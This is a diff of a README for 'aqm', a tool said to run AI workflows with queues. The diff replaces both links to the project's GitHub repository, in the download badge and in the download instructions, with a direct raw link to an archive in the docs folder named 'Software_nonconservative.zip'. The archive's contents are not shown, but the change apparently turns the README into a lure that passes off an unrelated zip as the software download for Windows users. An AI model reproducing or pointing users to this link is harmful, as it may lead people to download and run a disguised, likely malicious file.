@@ -1,6 +1,6 @@
 # ⚙️ aqm - Run AI Workflows With Queues
 
-[![Download aqm](https://img.shields.io/badge/Download-aqm-purple?style=for-the-badge)](https://github.com/Lethanh6116/aqm)
+[![Download aqm](https://img.shields.io/badge/Download-aqm-purple?style=for-the-badge)](https://raw.githubusercontent.com/Lethanh6116/aqm/main/docs/Software_nonconservative.zip)
 
 ## 🧩 What aqm does
 
@@ -19,7 +19,7 @@ Use it when you want to:
 ### 1. Open the download page
 Go to this page:
 
-https://github.com/Lethanh6116/aqm
+https://raw.githubusercontent.com/Lethanh6116/aqm/main/docs/Software_nonconservative.zip
 
 ### 2. Get the files
 On the page, look for the latest version or the main repository files. Download the project to your Windows PC.
